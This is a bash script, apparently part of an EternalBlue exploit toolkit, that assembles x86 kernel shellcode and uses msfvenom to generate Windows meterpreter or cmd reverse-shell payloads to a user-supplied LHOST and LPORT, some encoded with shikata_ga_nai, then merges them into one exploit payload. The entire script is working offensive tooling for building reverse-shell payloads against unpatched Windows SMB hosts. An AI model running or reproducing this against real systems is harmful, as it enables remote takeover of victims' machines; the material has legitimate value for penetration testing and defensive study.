#!/bin/bash
set -e
cat << "EOF"
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
EOF
echo Eternal Blue Windows Shellcode Compiler
echo
echo Let\'s compile them windoos shellcodezzz
echo
echo 'Compiling x86 kernel shellcode'
nasm -f bin eternalblue_kshellcode_x86.asm -o scx86kernel.bin
echo kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? \(Y\/n\)
read genMSF
if [[ $genMSF =~ [yY](es)* ]]
then
    echo LHOST for reverse connection:
    read ip
    echo LPORT you want x86 to listen on:
    read portTwo
    echo Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
    read cmd
    if [[ $cmd -eq 0 ]]
    then
        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
        read cmd
        if [[ $cmd -eq 0 ]]
        then
            echo 
            echo Generating x86 meterpreter shell \(staged\)...
            echo
            echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo -e x86/shikata_ga_nai -i 10 -b '\x00\x5c' --platform windows
            msfvenom -p windows/meterpreter/reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo -e x86/shikata_ga_nai -i 10 -b '\x00\x5c' --platform windows
        elif [[ $cmd -eq 1 ]]
        then
            echo 
            echo Generating x86 meterpreter shell \(stageless\)...
            echo
            echo msfvenom -p windows/meterpreter_reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
            msfvenom -p windows/meterpreter_reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        else
            echo Invalid option...exiting...
            exit 1
        fi
    elif [[ $cmd -eq 1 ]]
    then
        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
        read cmd
        if [[ $cmd -eq 0 ]]
        then
            echo
            echo Generating x86 cmd shell \(staged\)...
            echo
            echo msfvenom -p windows/shell/reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
            msfvenom -p windows/shell/reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        elif [[ $cmd -eq 1 ]]
        then
            echo
            echo Generating x86 cmd shell \(stageless\)...
            echo
            echo msfvenom -p windows/shell_reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo -e x86/shikata_ga_nai -i 10 -b '\x00\x5c' --platform windows
            msfvenom -p windows/shell_reverse_tcp -f raw -o scx86msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo -e x86/shikata_ga_nai -i 10 -b '\x00\x5c' --platform windows
        else
            echo Invalid option...exiting...
            exit 1
        fi
    else
        echo Invalid option...exiting...
        exit 1
    fi
echo
echo MERGING SHELLCODE WOOOO!!!
cat scx86kernel.bin scx86msf.bin > scx86.bin
python3 eternalblue_sc_merge.py scx86.bin sc_all.bin
else
    echo Okay cool, make sure you merge your own shellcode properly :\)
fi
echo DONE
exit 0
